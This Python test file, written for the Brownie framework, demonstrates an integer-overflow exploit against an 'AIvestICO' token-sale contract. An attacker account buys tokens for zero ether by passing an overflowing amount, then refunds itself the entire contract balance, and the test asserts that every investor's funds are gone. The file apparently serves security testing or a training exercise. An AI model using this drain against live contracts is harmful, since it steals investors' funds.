from brownie import accounts, AIvestICO, AIvestToken
from brownie.convert import to_uint
from web3.constants import MAX_INT
from web3 import Web3

def test_overflow_3():
    # ACCT SETUP

    [user, user2, user3, attacker, dep] = accounts[:5]

    #Deploying targets
    test = AIvestICO.deploy({'from': dep})
    token = AIvestToken.at(test.token())

    #Assigning variable for later testing
    FIRST_INVESTOR_INVESTED = to_uint(520e18)
    SECOND_INVESTOR_INVESTED = to_uint(126e18)
    THIRD_INVESTOR_INVESTED = to_uint(54e18)
    SECOND_INVESTOR_REFUNDED = to_uint(26e18)
    TOTAL_INVESTED = FIRST_INVESTOR_INVESTED+SECOND_INVESTOR_INVESTED+THIRD_INVESTOR_INVESTED -(SECOND_INVESTOR_REFUNDED*10//100)
    INITIAL_Attacker_balance = attacker.balance()

    # initial funding for gas expenses
    w3 = Web3(Web3.HTTPProvider())
    w3.provider.make_request("evm_setAccountBalance", [user.address, "0x65A4DA25D3016C00000"])
    w3.provider.make_request("evm_setAccountBalance", [user2.address, "0x65A4DA25D3016C00000"])
    w3.provider.make_request("evm_setAccountBalance", [user3.address, "0x65A4DA25D3016C00000"])

    # buying tokens for users1,2,3
    test.buy(FIRST_INVESTOR_INVESTED*10, {'from': user, 'value':FIRST_INVESTOR_INVESTED, 'gas_price': '1 gwei'})
    test.buy(SECOND_INVESTOR_INVESTED*10, {'from': user2, 'value':SECOND_INVESTOR_INVESTED, 'gas_price': '1 gwei'})
    test.buy(THIRD_INVESTOR_INVESTED*10, {'from': user3, 'value':THIRD_INVESTOR_INVESTED, 'gas_price': '1 gwei'})

    # REFUND user 2
    test.refund(SECOND_INVESTOR_REFUNDED, {'from': user2, 'gas_price': '1 gwei'})

    # attacker fun time
    #Setting overflow variable
    x = to_uint(to_uint(MAX_INT)//10 +1)
    # Exploiting overflow
    test.buy(x, {'from': attacker, 'value': 0})
    # MAX refund for max fun
    test.refund(test.balance()//10*100, {'from': attacker})

    # asserting free token on user balance
    assert(test.balance() == 0)
    assert(attacker.balance() == TOTAL_INVESTED + INITIAL_Attacker_balance)
